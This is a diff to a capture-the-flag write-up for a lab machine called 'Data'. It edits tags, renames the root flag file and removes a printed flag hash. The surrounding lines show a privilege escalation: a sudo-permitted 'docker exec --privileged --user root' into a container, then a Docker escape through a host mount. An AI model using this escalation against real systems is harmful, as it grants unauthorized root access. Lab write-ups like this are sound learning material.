@@ -1,7 +1,7 @@
 ---
 title: Data
 slug: Data
-tags: [Linux, Grafana, Docker, Vulnerability Research]
+tags: [Docker, Vulnerability Research]
 ---
 Overview
 
@@ -198,8 +198,8 @@ boris     6710  0.0  0.0  14860  1120 pts/0    S+   07:45   0:00 grep --color=au
 ```
 
 ```bash
-boris@data:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bashbash-5.1# cat /root/root.txt
-cat: can't open '/root/root.txt': No such file or directory
+boris@data:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bashbash-5.1# cat /root/privileged-proof.txt
+cat: can't open '/root/privileged-proof.txt': No such file or directory
 ```
 
 For Docker Escape check for the mount in the docker.
@@ -267,8 +267,7 @@ boot            initrd.img      lost+found      proc            snap            
 dev             initrd.img.old  media           root            srv             var
 etc             lib             mnt             run             sys             vmlinuz
 bash-5.1# cd root
-bash-5.1# cat root.txt
-e6af9c7c4436ec5cd755fa1b97d386ad
+bash-5.1# cat privileged-proof.txt
 ```
 
 ---
